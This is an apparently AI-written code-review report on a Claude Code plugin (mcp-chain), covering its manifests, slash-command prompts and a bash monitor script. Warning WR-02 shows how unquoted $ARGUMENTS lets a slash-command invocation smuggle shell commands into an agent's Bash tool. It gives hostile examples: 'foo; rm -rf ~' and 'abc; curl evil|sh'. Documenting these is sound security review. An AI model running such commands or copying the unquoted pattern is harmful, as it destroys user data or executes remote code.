---
phase: 08-plugin-packaging
reviewed: 2026-04-24T18:00:00Z
depth: standard
files_reviewed: 13
files_reviewed_list:
  - .claude-plugin/marketplace.json
  - plugin/.claude-plugin/plugin.json
  - plugin/.mcp.json
  - plugin/commands/reg.md
  - plugin/commands/wait.md
  - plugin/commands/list.md
  - plugin/commands/purge.md
  - plugin/scripts/chain-wait.sh
  - internal/plugin/manifest_test.go
  - scripts/check-plugin-manifests.sh
  - scripts/check-prompt-wordcount.sh
  - scripts/check-chain-wait-bashisms.sh
  - scripts/check-no-stale-paths.sh
  - scripts/smoke-chain-wait.sh
  - scripts/internal/seed_pending.go
findings:
  critical: 0
  warning: 2
  info: 6
  total: 8
status: issues_found
---

# Phase 8: Code Review Report

**Reviewed:** 2026-04-24T18:00:00Z
**Depth:** standard
**Files Reviewed:** 13 (plus 2 Go helpers)
**Status:** issues_found (2 warnings, 6 info — no critical issues)

## Summary

Phase 8 cleanly delivers the four plugin manifests, four slash-command prompts, the bash-3.2-safe `chain-wait.sh` monitor, and the E2E smoke harness. All five automated gates pass (manifest JSON, prompt word-count ≤30, bashism lint, stale-path grep, smoke harness resolve/unknown/timeout cases). `go.mod` / `go.sum` are byte-identical to the pre-phase baseline, `seed_pending.go` is correctly excluded from the production binary via `//go:build ignore`, and LD-14 / LD-13 compliance holds (no stale `/chain-*` references outside allowlisted files; `marketplace.json` lives at repo root). The duration parser correctly rejects `1h30m`, `1d`, `0.5h`, `-5s`, `0s`, and values exceeding 604800s, and `chain-wait.sh` properly quotes `"$ID"`, `"$1"`, and `"$BIN"` everywhere — no shell-injection surface inside the monitor itself. Two warnings concern (a) a placeholder `OWNER` GitHub URL that will ship in a release manifest, and (b) unquoted `$ARGUMENTS` interpolation in `wait.md` / `purge.md` prompts that is a shell-injection surface when Claude Code renders the prompt into a Bash-tool invocation. Info items flag minor UX polish and a missed validation row.

## Warnings

### WR-01: Placeholder `OWNER` GitHub URL ships in `plugin.json`

**File:** `plugin/.claude-plugin/plugin.json:8`
**Issue:** The `repository` field is `https://github.com/OWNER/mcp-chain` — a literal placeholder string. If Phase 9 GoReleaser ships this manifest unchanged, the installed plugin advertises a 404 URL and any tooling that follows `repository` fails. No automated gate (manifest tests, stale-path gate, word-count) catches this because neither `OWNER` nor the URL shape is on any denylist. VALIDATION row `TestPluginJSON_RequiredKeys` only asserts presence of `name`/`version`/`description`/`author`, not correctness of optional fields.
**Fix:** Either (a) resolve the owner now (e.g., the real GitHub handle) before Phase 9 cuts a release, or (b) add a gate:
```sh
# scripts/check-plugin-manifests.sh — add after the reject-list loop
if grep -q -F '"OWNER"' plugin/.claude-plugin/plugin.json \
   || grep -q -F 'github.com/OWNER/' plugin/.claude-plugin/plugin.json; then
  echo "FAIL: plugin.json still contains OWNER placeholder" >&2
  FAIL=1
fi
```
Option (a) is preferred — a placeholder URL in a public release manifest is a correctness issue, not a style issue.

### WR-02: Unquoted `$ARGUMENTS` in `wait.md` / `purge.md` is a shell-injection surface at prompt-render time

**File:** `plugin/commands/wait.md:6`, `plugin/commands/purge.md:6`
**Issue:** Both prompts tell Claude to execute a shell command with `$ARGUMENTS` interpolated **outside** any quoting. At Claude Code's prompt-render step, `$ARGUMENTS` becomes the literal text the user typed after the slash command, and that text is then handed to the Bash tool. Concretely, if a user runs `/mcp-chain:wait "foo; rm -rf ~"`, Claude sees a prompt instructing it to run:

```
bash .../chain-wait.sh foo; rm -rf ~
```

`chain-wait.sh` itself is safe (it quotes `"$1"`, `"$ID"`, `"$BIN"` — verified), but the command the Bash tool receives has already been split at the `;` boundary. The trust boundary here is: can a user (adversary or not) invoking the slash command cause arbitrary-shell execution in the agent session? Answer: effectively yes, via `$ARGUMENTS` passthrough. This is a known Claude-Code plugin-ecosystem hazard (token smuggling) and not unique to `mcp-chain`, but it is worth documenting.

For `purge.md` the blast radius is smaller (`mcp-chain purge $ARGUMENTS` — anything after `purge` that mcp-chain doesn't recognize exits 1) but the injection surface is identical: `/mcp-chain:purge 'abc; curl evil|sh'`.

For `reg.md` the surface is lower because the prompt asks Claude to call the MCP tool with `condition="$ARGUMENTS"` — Claude constructs a JSON tool call, not a shell command, so the shell-metachar path is not taken. The risk reduces to prompt-injection of Claude itself (out of scope for this review).

**Fix:** Two-part:
1. In `wait.md` and `purge.md`, instruct Claude to pass `$ARGUMENTS` as a **single quoted argument** rather than splice raw:
   ```
   Run: MCP_CHAIN_BIN="${CLAUDE_PLUGIN_ROOT}/bin/mcp-chain" bash "${CLAUDE_PLUGIN_ROOT}/scripts/chain-wait.sh" "$ARGUMENTS"
   ```
   This breaks `--timeout 10s` splitting because chain-wait.sh will see one token. A robust alternative is to tell Claude to split the arguments itself (shell-safe) before calling Bash — but that adds words and trusts the model more. The cleanest fix is item 2.
2. Document the hazard in Phase 10's README security section and mark it as "plugin author assumes trusted slash-command invocation, same threat model as Claude Code itself." This is effectively the Claude Code ecosystem norm.

If neither fix is adopted, leave this as an acknowledged deferred item in the phase summary. Severity stays at WARNING (not CRITICAL) because the implicit threat model for a user invoking their own slash command is trusted input.

## Info

### IN-01: `chain-wait.sh` binary-missing path emits a shell error, not an mcp-chain error

**File:** `plugin/scripts/chain-wait.sh:104`
**Issue:** When `$BIN` resolves to a nonexistent command (e.g., user misconfigures `MCP_CHAIN_BIN` or `mcp-chain` not on PATH), the first `"$BIN" status "$ID" >/dev/null 2>&1` returns 127 and the LD-5 `*)` branch re-runs the binary to capture stderr via `STDERR="$( "$BIN" status ... )"`. The re-run also fails with 127 but its stderr is the raw shell `command not found` string, e.g. `/path/chain-wait.sh: line 119: mcp-chain: command not found`. Exit code is correctly 1, but the user-facing error leaks the monitor script's internal line number.
**Fix:** After the first exit-code check, special-case 127:
```sh
case "$CODE" in
  0) echo "continue"; exit 0 ;;
  2) : ;;  # pending, loop
  127)
    echo "mcp-chain: binary not found: $BIN" >&2
    exit 1
    ;;
  *)
    # existing re-run for stderr capture
    ...
esac
```
Low severity — the user recovers by fixing PATH; the error still points at the right problem.

### IN-02: Re-run for stderr capture is racy on transient failures

**File:** `plugin/scripts/chain-wait.sh:118-119`
**Issue:** LD-5's approach for capturing stderr on error is: run once, discover non-{0,2} exit, run a second time to capture the stderr message. Between the two runs, state.json could transition (e.g., the chain resolves, or another process purges it), so the second run may return a different exit code than the first. Current code prints the captured stderr (possibly empty) and exits 1 regardless. If the first run returned 1 (unknown) and the second run returns 0 (just resolved), the user sees an error but the chain is actually resolved. Extremely narrow race window; also this can't happen on macOS bash 3.2 any more than it can on Linux bash 5.
**Fix:** Optionally, capture stdout+stderr in the **first** call by changing the poll to `OUT_ERR=$("$BIN" status "$ID" 2>&1); CODE=$?`. Costs one subshell per poll but eliminates the race and halves the binary invocations on error. Deferred polish — not worth re-opening the phase.

### IN-03: ID with leading dash (`-foo`) produces kong flag-parse error rather than "unknown id"

**File:** `plugin/scripts/chain-wait.sh:104` (symptom surfaces in kong)
**Issue:** `chain-wait.sh -foo` passes `-foo` as the positional arg; `bash .../chain-wait.sh -foo` enters the `--*)` arm and exits 1 with "unknown flag: -foo" — that part is correct. BUT `chain-wait.sh "-foo"` (quoted) hits the `*)` ID-assignment arm, then the monitor runs `"$BIN" status "-foo"` and kong parses `-f` as an unknown flag, returning exit 80. chain-wait.sh's `*)` branch maps exit 80 → exit 1 with no useful stderr. Not a chain-wait bug per se, but observable user pain.
**Fix:** Either (a) use `$BIN status -- "$ID"` (double-dash terminator) so kong treats `-foo` as positional, or (b) validate in chain-wait.sh that `$ID` does not start with `-`. Option (a) is one-character and robust:
```sh
"$BIN" status -- "$ID" >/dev/null 2>&1
```
Verify kong accepts `--` as positional terminator (standard kong behavior; verify once, then keep).

### IN-04: `check-no-stale-paths.sh` runs `set -eu` but `git grep` noise (empty stderr) is swallowed by `|| true`

**File:** `scripts/check-no-stale-paths.sh:23-29`
**Issue:** `HITS="$(git grep ... | grep -vE '/chain-...\.sh' || true)"` — the `|| true` at the outer subshell level means `set -eu` won't catch a `git grep` failure (e.g., repo corruption, not-a-git-repo). Low severity because the gate is run from repo root in CI.
**Fix:** Optional. Replace with explicit check:
```sh
if HITS="$(git grep -InE ... 2>/dev/null)"; then
  : # grep found matches
else
  HITS=""
fi
```

### IN-05: VALIDATION row `TestPromptArgumentHints` is not implemented as a test

**File:** `internal/plugin/manifest_test.go:133-174`
**Issue:** Row from `08-VALIDATION.md` line 54: *"`argument-hint:` frontmatter present on arg-taking commands; `list.md` may omit"*. The Go tests assert `argument-hint:` is present in `reg.md` (line 140) but do NOT explicitly assert it in `wait.md` or `purge.md`, and do NOT assert its absence in `list.md`. `TestPromptWait_InvokesChainWaitScript` and `TestPromptPurge_TrustsBinaryForBareArgs` skip this check. `list.md` correctly omits it. Coverage is 1-of-4.

Actual state on disk is correct (wait.md and purge.md both have `argument-hint:`, list.md does not), so no regression — just a gap between VALIDATION promise and test reality.

**Fix:** Tighten the tests:
```go
// in TestPromptWait_InvokesChainWaitScript
require.Contains(t, raw, "argument-hint:", "LD-10: wait takes <id> [--timeout]")
// in TestPromptPurge_TrustsBinaryForBareArgs
require.Contains(t, raw, "argument-hint:", "LD-10: purge takes <id>|--all|--resolved")
// in TestPromptList_InvokesBinaryList
require.NotContains(t, raw, "argument-hint:", "LD-10: list takes no args")
```

### IN-06: VALIDATION row `TestReadmePhase10TODO` is a no-op (no README exists)

**File:** `README.md` (does not exist)
**Issue:** VALIDATION row 71 says `TestReadmePhase10TODO` — *"If present, includes entries for marketplace.json, renamed commands … else no-op pass"*. There is no `README.md` at the repo root and no corresponding test. The row is a no-op per its own wording, so this is compliant, but it means Phase 8's claim of "29 rows, all mapped" is 28 real rows + 1 soft-optional row that neither fires nor is stubbed out in `manifest_test.go`.

Also worth noting for Phase 10 handoff: the marketplace rename and `/mcp-chain:*` namespace are not yet documented anywhere user-facing.

**Fix:** Either (a) stub a `TestReadmePhase10TODO` that skips cleanly with `t.Skip("no README yet — Phase 10")`, so coverage accounting is honest; or (b) leave as-is and note in Phase 9/10 handoff that the README will need the marketplace/namespace docs.

---

## Compliance Check Against Review Focus Areas

| # | Focus | Status | Evidence |
|---|-------|--------|----------|
| 1 | LD-14: no user-facing `/chain-*` | **PASS** | `check-no-stale-paths.sh` passes; manifest tests assert `NotContains` for each literal |
| 2 | LD-13: marketplace.json at repo root `.claude-plugin/` | **PASS** | File at correct path; `TestMarketplaceJSON_Valid` asserts structure |
| 3 | chain-wait.sh bash 3.2 safety + exit codes + duration parser | **PASS** | `bash -n` ok; bashism gate passes; manual test: `168h` accepted, `169h`/`1h30m`/`0.5h`/`0s`/`-5s`/`1d` all rejected; exit codes 0/1/124 verified via smoke harness |
| 4 | Word budget ≤30 | **PASS** | list=8, purge=17, reg=23, wait=18 |
| 5 | `MCP_CHAIN_BIN` env override end-to-end | **PASS** | Smoke harness exports `MCP_CHAIN_BIN=$BIN` and all three cases succeed |
| 6 | `//go:build ignore` on seed_pending.go | **PASS** | `go build ./...` does not compile it; `go run path/to/file.go` still works |
| 7 | Shell injection surfaces | **partial** | chain-wait.sh clean (all quoted). `$ARGUMENTS` passthrough in wait.md/purge.md is a shell-injection surface by design — see WR-02 |
| 8 | Prompt bodies useful, not too terse | **PASS** | Each names the tool/binary/path precisely; reg.md includes condition-prompt fallback; wait.md wires MCP_CHAIN_BIN + chain-wait.sh; list.md is a direct call; purge.md defers to binary for arg validation. No branching prose. |
| 9 | Manifest JSON schema completeness | **mostly** | All required fields present; `OWNER` placeholder in `plugin.json.repository` ships as-is — see WR-01 |
| 10 | 29 validation rows have evidence | **mostly** | 27 rows have direct test/gate evidence. Row 54 (`TestPromptArgumentHints`) is partially enforced (reg only) — IN-05. Row 71 (`TestReadmePhase10TODO`) is a documented no-op — IN-06. |

---

_Reviewed: 2026-04-24T18:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
